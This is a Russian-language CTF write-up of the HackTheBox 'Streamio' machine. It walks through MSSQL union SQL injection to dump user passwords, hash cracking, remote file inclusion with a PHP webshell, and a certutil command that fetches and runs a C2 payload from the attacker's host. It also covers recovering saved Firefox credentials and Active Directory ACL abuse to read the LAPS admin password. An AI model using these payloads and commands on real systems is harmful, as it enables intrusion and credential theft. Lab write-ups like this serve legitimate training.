---
layout: post
title: HTB Streamio writeup
lang: ru
permalink: /posts/2024-09-20-streamio-htb-writeup
---

![streamio-thumb.webp]({{ site.baseurl }}/images/streamio-thumb.webp)

## Intro

Привет, хакеры! В этой средней машине от HTB мы будем эксплуатировать SQL-инъекции, удаленное включение файлов PHP и горизонтально перемещаться между пользователями с помощью bloodhound и браузера firefox. Я буду использовать sliver C2 для выполнения команд и управления сессиями от разных пользователей.


## Enumeration 
```
Nmap scan report for streamio (10.129.202.132)
Host is up (0.064s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-07 22:34:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-09-07T22:35:44+00:00; +7h00m00s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:   b99a:2c8d:a0b8:b10a:eefa:be20:4abd:ecaf
|_SHA-1: 6c6a:3f5c:7536:61d5:2da6:0e66:75c0:56ce:56e4:656d
|_http-title: Not Found
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
![951d3490cad0ffaf135add5f807e6b7d.png]({{ site.baseurl }}/images/951d3490cad0ffaf135add5f8|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49680/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-07T22:35:05
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

#### перебор директорий streamio.htb
![951d3490cad0ffaf135add5f807e6b7d.png]({{ site.baseurl }}/images/951d3490cad0ffaf135add5f807e6b7d.png)

![677032fa520f5c178bafd632cea2c55f.png]({{ site.baseurl }}/images/677032fa520f5c178bafd632cea2c55f.png)

*master.php кажется интересным, но мы не можем ничего с ним сделать прямо сейчас, поэтому оставим его на потом.*
![a80bb040ecf94257ea30da5c897af455.png]({{ site.baseurl }}/images/a80bb040ecf94257ea30da5c897af455.png)

#### перебор директорий watch.streamio.htb
![89cf16b81422939a96ad2098cf841cbe.png]({{ site.baseurl }}/images/89cf16b81422939a96ad2098cf841cbe.png)

***

## SQLi

Используя перебор каталогов, мы нашли файл с именем [search.php](https://watch.streamio.htb/search.php) 

Он содержит строку поиска, которая позволяет искать фильмы

![d702f0dbcf3428e170d03bc5e9ba675c.png]({{ site.baseurl }}/images/d702f0dbcf3428e170d03bc5e9ba675c.png)

Мы видим, что `a' AND 1=1 --` и `a' AND 1=2 --` дают разные результаты, что свидетельствует о наличии уязвимости SQLi.

![c4465ebccbc01046b3e6054db88d10d3.png]({{ site.baseurl }}/images/c4465ebccbc01046b3e6054db88d10d3.png)

Мы обнаружили sql-инъекцию union select 

**Далее все полезные нагрузки закодированы в URL формат**

![91f40d1c2dccf0816da06054dd9eedec.png]({{ site.baseurl }}/images/91f40d1c2dccf0816da06054dd9eedec.png)

![c2a3935064dc76accc5cf8c823aea851.png]({{ site.baseurl }}/images/c2a3935064dc76accc5cf8c823aea851.png)

### Вытаскиваем данные MSSQL

Используя следующую полезную нагрузку, мы находим имя базы данных, с которой взаимодействуем `10'+union+select+1,db_name(),2,3,4,5 --` *STREAMIO*.

После этого мы можем посмотреть, какие таблицы нам доступны, возможно, мы найдем креды пользователей.

![91106285856976352b502f0b839dab77.png]({{ site.baseurl }}/images/91106285856976352b502f0b839dab77.png)
*` 10' union select 1,table_name,2,3,4,5 FROM information_schema.tables -- `*

*[contents of information_schema.tables](https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/)*

Затем мы можем выбрать из таблицы пользователей, однако мы не знаем, какие столбцы она содержит. Мы можем попробовать угадывать, но в [portswigger SQLi cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) есть еще один полезный запрос, который мы можем использовать.
`SELECT * FROM information_schema.columns WHERE table_name = 'users'`

*Но поскольку у нас уязвимость типа union select, мы не можем просто выбирать данные, поэтому мы используем тот же трюк, что и в предыдущем запросе*.

![287a1b81c60310670df037a1d501f186.png]({{ site.baseurl }}/images/287a1b81c60310670df037a1d501f186.png)
Мы получили имена столбцов, теперь, чтобы извлечь данные, нам нужно использовать конкатенацию строк. Мы видим, что поскольку число 2 также печатается с запросом, *(Отмечено зелеными стрелками)*, то, возможно, мы могли бы использовать второй столбец. Однако когда мы пытаемся заменить «2» строкой, запрос не возвращается, а это значит, что тип данных второго столбца в исходном запросе не является строкой.

![fe275dcbc2b5e976537aeb75a005c567.png]({{ site.baseurl }}/images/fe275dcbc2b5e976537aeb75a005c567.png)

*Синтаксис объединения строк в шпаргалке portswigger мне не подошел, поэтому я использовал функцию MSSQL concat*.

 `10'+union+select+1,CONCAT(username,+'%3a',+password),2,3,4,5+FROM+users+--`

![32231b5a929b7580a88191312c884169.png]({{ site.baseurl }}/images/32231b5a929b7580a88191312c884169.png)

В ответе приходит куча паролей и хэшей, поэтому я скачаю страницу и выведу их в формате grep

![7f4ee8ad8cb51848ab315a4bad542c09.png]({{ site.baseurl }}/images/7f4ee8ad8cb51848ab315a4bad542c09.png)

Мы можем сказать, что это похожи на md5-хэши, но если вы сомневаетесь, используйте *hashid* из kali.

Теперь брутим их с помощью hashcat 

`hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username -o db_hashes_recovered.txt`

![592aeee1a72f02cb12b5a9549af4f4ae.png]({{ site.baseurl }}/images/592aeee1a72f02cb12b5a9549af4f4ae.png)

Затем я убрал сам хэш и оставил только логины и пароли с помощью awk, чтобы проверить эти учетные данные на `streamio.htb/login.php`

`awk -F ":" '{print $1 ":" $3}' user_pass.txt`

Мы можем использовать hydra, чтобы проверить, сможем ли мы за логиниться. 

![64d434c8ddd0c9504bc51f316909db44.png]({{ site.baseurl }}/images/64d434c8ddd0c9504bc51f316909db44.png)

***

## Эксплуатируем админ панель

После успешного логина на streamio.htb, мы получаем доступ к странице /admin, ранее недоступной для нас.

Давайте попробуем перебрать каталоги.

Мы видим, что параметр в url, похоже, указывает на страницы, поскольку он меняется всякий раз, когда мы нажимаем на другой раздел.

![78a8ea1dfb22cd16f09c268e2c3dbf3c.png]({{ site.baseurl }}/images/78a8ea1dfb22cd16f09c268e2c3dbf3c.png)

Мы можем по фаззить этот параметр чтобы найти другие страницы

![112166403e09e9efa18269f9e0b2f93c.png]({{ site.baseurl }}/images/112166403e09e9efa18269f9e0b2f93c.png)

То, что мы еще не видели, - это страница отладки *(debug)*, давайте посмотрим на это.

Если мы передадим в параметр дебаг, значение master.php, страницу которую мы нашли ранее на этапе разведки, то увидим страницу, которая ранее была нам недоступна, поскольку ее можно было только инклюдить. Похоже, что она  содержит код для всех остальных вкладок.

![3d513b30a4ac2ad0511e673f5642dcbb.png]({{ site.baseurl }}/images/3d513b30a4ac2ad0511e673f5642dcbb.png)

Если открыть страницу в HTML виде мы можем найти интересную форму, которая не отображается как вкладка, она содержит параметр *'include'* :

![31a37e96866effbf048abf873c03f74f.png]({{ site.baseurl }}/images/31a37e96866effbf048abf873c03f74f.png)

Это означает, что если мы сделаем post-запрос к странице debug с параметром include, мы сможем включить произвольные файлы, а если доступен удалённый инклюд файлов, мы сможем загрузить веб шелл PHP.

![0608b28006f586db588837cd5895125b.png]({{ site.baseurl }}/images/0608b28006f586db588837cd5895125b.png)
![829bbb9785f40eca1e0236d9a92a997d.png]({{ site.baseurl }}/images/829bbb9785f40eca1e0236d9a92a997d.png)

О чудо, сервер инклюдит удалённые файлы, давайте организуем шелл.

## Удалённое выполнение команд

Webshell content:
```php

    if(isset($_POST['cmd']))
    {
        system($_POST['cmd']);
    }

```

Так как мы не загружаем веб шелл, а только инклюдим, нам нужно будет это делать с каждым запросом. 

![e092817e578e7cae56283fb65f8c4794.png]({{ site.baseurl }}/images/e092817e578e7cae56283fb65f8c4794.png)
*Оно работает!*

Давайте запустим полезную нагрузку sliver, 

#### *полезная нагрузка*

*В реальном ред-тиминге, пожалуйста, никогда не загружайте не обфусцированный sliver c2 shell на систему, вы будете замечены EDR или чем-либо еще, немедленно.*

```cmd

certutil.exe -f -split -urlcache http://10.10.14.117/rs.exe && .\rs.exe

```

![8cfcea2cb8dd744d9e1ece7d6219566c.png]({{ site.baseurl }}/images/8cfcea2cb8dd744d9e1ece7d6219566c.png)

***

## Обнаружение учётных записей db_user и db_admin
Найдены по адресу: **C:\inetpub\streamio.htb\admin\index.php** 
в исходном коде страницы админ панели.

![5534b13189a2a56bcf7ed9b0d07340fa.png]({{ site.baseurl }}/images/5534b13189a2a56bcf7ed9b0d07340fa.png)

*Креды для db_user нам не интересны, у него меньше привилегий чем у администратора.*

## Посмотрим на БД MSSQL

![f65d0320b6c921e75ca7a45105780f24.png]({{ site.baseurl }}/images/f65d0320b6c921e75ca7a45105780f24.png)
Если мы запустим `netstat -ano`, то увидим список процессов на портах, мы видим порт для MSSQL, поэтому мы прокинем порт от нашей машины на хост который атакуем, чтобы заглянуть внутрь.

![5b42455c03d93cdc03030c0711ad5752.png]({{ site.baseurl }}/images/5b42455c03d93cdc03030c0711ad5752.png)

В БД я нашёл хэш nikk37, пользователь с таким же именем существует и в домене который мы атакуем.

![91983bdab4dc80e03c39b0fce481c6c7.png]({{ site.baseurl }}/images/91983bdab4dc80e03c39b0fce481c6c7.png)

![4f82ed80b48bdff3614f31e0fb3e0519.png]({{ site.baseurl }}/images/4f82ed80b48bdff3614f31e0fb3e0519.png)

Давайте сбрутим его с помощью hashcat

```
hashcat -m 0 -a 0 nikk37.hash --username -o nikk37.recovered /usr/share/wordlists/rockyou.txt
```

![f0614a847aebe1027f03d7b5dcd972cf.png]({{ site.baseurl }}/images/f0614a847aebe1027f03d7b5dcd972cf.png)

***

## Повышение привилегий

Нам повезло, у nikk37 есть доступ через winrm.

![fbf78248592dcb2a4580a4535e4d2d50.png]({{ site.baseurl }}/images/fbf78248592dcb2a4580a4535e4d2d50.png)

## Сохранённые учётные данные в Firefox 

Когда мы запускаем winPEAS, то получаем интересное сообщение о том, что найдены сохранённые креды в firefox. Мы можем скачать их и расшифровать локально, посмотрим, есть ли в них что-нибудь интересное.

Расшифровать данные из firefox можно с помощью утилиты [firefox_decrypt](https://github.com/unode/firefox_decrypt)

![77a5102d033c64218eb912b99baf2848.png]({{ site.baseurl }}/images/77a5102d033c64218eb912b99baf2848.png)

![21d2cd64bea975481043acbe53f6eb51.png]({{ site.baseurl }}/images/21d2cd64bea975481043acbe53f6eb51.png)

```text
Website:   https://slack.streamio.htb
Username: 'admin'
Password: 'JDg0dd1s@d0p3cr3@t0r'

Website:   https://slack.streamio.htb
Username: 'nikk37'
Password: 'n1kk1sd0p3t00:)'

Website:   https://slack.streamio.htb
Username: 'yoshihide'
Password: 'paddpadd@12'

Website:   https://slack.streamio.htb
Username: 'JDgodd'
Password: 'password@12'

```

Мы можем попробовать эти пароли для всех пользователей что нам знакомы, возможно что-то подойдёт.

## Смотрим на пользователя JDgodd 

Найденные данные позволили нам получить доступ к 'JDgodd', к сожалению, у него нет прав удаленного доступа, поэтому нам придется использовать runas или powershell, чтобы воспользоваться им.

![ad1f48f8009acff8600457889810ef04.png]({{ site.baseurl }}/images/ad1f48f8009acff8600457889810ef04.png)

*Вы можете найти права пользователя, группы и т.д. различными способами, но я просто заглянул в данные bloodhound, которые я собрал ранее*.

### Путь от JDgodd к Administrator
![7da248e25ec4bac8509c68d1ca737b3f.png]({{ site.baseurl }}/images/7da248e25ec4bac8509c68d1ca737b3f.png)

*Номера в этом списке соответствуют тем же номерам на схеме*.
1. Привилегия write owner означает, что JDgodd может изменить владельца группы 'CORE STAFF', если мы сделаем владельцем пользователя, которого мы контролируем, мы сможем добавлять пользователей в эту группу.
2. Привилегия [ReadLAPSPassword](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword) для группы CORE STAFF означает, что вы можете прочитать из LAPS пароль учетной записи компьютера (т.е. пароль локального администратора компьютера).

#### Выполняем атаку

##### Делаем JDgodd владельцем группы 

*Создаём объект кредов для JDgodd*
```powershell
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
```

*Добавляем nikk37 to 'CORE STAFF'*
```powershell
#set the owner of CORE STAFF to be JDgodd
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity 'JDgodd' -Credential $Cred

#Give all rights on CORE STAFF to JDgodd (to allow us to write members)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CORE STAFF" -Rights All -PrincipalIdentity JDgodd

#Add nikk37 to the group core staff
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'nikk37' -Credential $Cred
```

![df467cd45de263f69c29f1088e2f2669.png]({{ site.baseurl }}/images/df467cd45de263f69c29f1088e2f2669.png)

После этого *nikk37* сможет прочитать пароль учетной записи локального администратора из LAPS. Мы можем сделать это с помощью netexec.

![393ba2e805d78518d662b4e1dbe362da.png]({{ site.baseurl }}/images/393ba2e805d78518d662b4e1dbe362da.png)

Мы получаем пароль Администратора и логинимся через winrm

![4f6013cca0cd1fb2bab74fded732904f.png]({{ site.baseurl }}/images/4f6013cca0cd1fb2bab74fded732904f.png)

Запавнено.

Удачного взлома друзья!
(Не используйте знания во вред, только там где вам разрешил владелец ресурса.)
